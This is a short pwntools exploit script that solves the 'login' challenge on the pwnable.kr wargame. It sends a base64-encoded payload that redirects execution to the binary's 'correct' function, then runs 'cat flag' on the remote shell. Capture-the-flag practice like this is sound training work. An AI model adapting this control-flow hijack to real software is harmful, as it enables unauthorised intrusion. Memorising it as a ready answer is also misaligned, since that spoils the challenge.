from pwn import *
import argh


ADDR = 'pwnable.kr'
PORT = 9003


gdb_script = '''
    layout regs
    b *main
    b *0x8049424
    b *0x8049402
    display/4wx 0x811eb40
    continue
'''


def start_gdb(p):
    gdb.attach(p, gdb_script)


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './login'
    e = ELF(bin_path)

    if local:
        # p = process(bin_path)
        # start_gdb(p)
        p = gdb.debug(bin_path, gdb_script)
    elif runpwn:
        p = remote(ADDR, PORT)

    shellcode = b64e(p32(0xdeadbeef) + p32(e.symbols[u'correct']) + p32(e.symbols[u'input']))
    p.sendline(shellcode)
    p.recvline()
    p.sendline('cat flag')
    p.recvline()
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

